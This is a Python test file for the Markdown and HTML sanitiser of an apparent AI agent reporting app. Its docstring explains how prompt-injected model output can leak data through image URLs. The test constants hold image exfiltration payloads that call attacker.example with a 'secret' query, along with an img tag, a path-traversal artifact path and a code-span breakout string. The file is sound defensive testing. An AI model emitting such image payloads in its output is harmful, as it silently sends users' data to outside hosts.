"""Frontend Markdown hygiene (review M2): untrusted text must never render as an image.

A rendered Markdown image is fetched by the viewer's browser immediately, so data or
prompt-injected model output could exfiltrate values in the image URL without any click.
Charts are the one exception, and only from the job's own ``/artifacts`` URLs, which the UI
fetches server-side.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "frontend"))

import render  # noqa: E402
from ui_helpers import step_html, step_view  # noqa: E402

markdown_it = pytest.importorskip("markdown_it")

EXFIL = "![x](https://attacker.example/p?d=secret)"
REF_EXFIL = "![x][1]\n\n[1]: https://attacker.example/p?d=secret"
NESTED = "![a](https://attacker.example/p?d=(secret))"
CHART = "/artifacts/revenue-by-region-1a2b3c4d.png"


def _has_image(md: str) -> bool:
    tokens = markdown_it.MarkdownIt("commonmark").parse(md)
    stack = list(tokens)
    while stack:
        tok = stack.pop()
        if tok.type == "image":
            return True
        stack.extend(tok.children or [])
    return False


def _md(parts: list[tuple[str, str, str]]) -> str:
    return "\n".join(v for k, v, _ in parts if k == "md")


@pytest.mark.parametrize("payload", [EXFIL, REF_EXFIL, NESTED])
def test_report_cannot_render_images(payload):
    assert _has_image(payload)  # sanity: the payload is an image before sanitising
    parts = render.report_parts(f"# Report\n\n{payload}\n", [CHART])
    assert not _has_image(_md(parts))
    assert [k for k, _, _ in parts if k == "chart"] == []


def test_report_charts_render_only_from_the_jobs_own_artifacts():
    report = (
        f"Intro\n\n![Revenue by region]({CHART})\n\nMore\n\n"
        "![other job](/artifacts/someone-else.png)\n\n"
        "![traversal](/artifacts/../jobs.sqlite3)\n\n"
        f"![query](/artifacts/a.png?d=secret)\n\n{EXFIL}\n"
    )
    allowed = [CHART, "/artifacts/../jobs.sqlite3", "/artifacts/a.png?d=secret"]
    parts = render.report_parts(report, allowed)
    assert [(k, v) for k, v, _ in parts if k == "chart"] == [("chart", CHART)]
    assert not _has_image(_md(parts))
    assert "image not shown" in _md(parts) and "Intro" in _md(parts)


def test_chart_caption_is_safe():
    parts = render.report_parts(f"![a ![b]({CHART})", [CHART])
    captions = [c for k, _, c in parts if k == "chart"]
    assert captions and not any(_has_image(c) for c in captions)


@pytest.mark.parametrize(
    ("event", "data"),
    [
        ("tool_result", {"name": "run_sql", "ok": True, "summary": f"| note |\n| {EXFIL} |"}),
        ("plan", {"plan": REF_EXFIL}),
        ("critic", {"verdict": "revise", "issues": [NESTED]}),
        ("approval_required", {"tool": "run_sql", "reasons": [EXFIL]}),
        ("approval_decision", {"tool": "run_sql", "approved": False, "note": EXFIL}),
        ("stop", {"status": "max_turns", "detail": EXFIL}),
        ("error", {"message": f'{EXFIL} <img src="https://attacker.example/x">'}),
    ],
)
def test_timeline_rows_cannot_render_images(event, data):
    """The timeline is HTML (st.html), escaped: no <img>, and no Markdown is interpreted."""
    step = step_view(event, data)
    assert step is not None
    out = step_html(step)
    assert "<img" not in out.lower()


def test_code_span_cannot_be_closed_by_the_value():
    col = "x` ![a](https://attacker.example/p) `"
    md = render.code_span(col)
    assert md.count("`") == 2 and not _has_image(render.safe_md(md))


def test_metric_labels_and_errors_are_safe():
    assert not _has_image(render.safe_md(EXFIL))
    assert not _has_image(render.safe_md(REF_EXFIL))


SHORT_EXFIL = "![](//e.example/?d=42)"  # fits the 40-character tile clip


@pytest.mark.parametrize("value", [SHORT_EXFIL, "![x][1]"])
def test_key_number_tiles_cannot_render_images(value):
    """Review-2 M4: ``st.metric`` renders Markdown images in the *value* as well as the label,
    and key-number values are model text; only the label was made inert."""
    from ui_helpers import scalar_numbers

    assert _has_image(SHORT_EXFIL)  # sanity: the payload is an image before sanitising
    tiles = scalar_numbers({"top_region": value, SHORT_EXFIL: 1})
    for label, text in tiles:
        assert not _has_image(label) and not _has_image(f"{text}\n\n[1]: https://e.example/")
    assert len(tiles) == 2
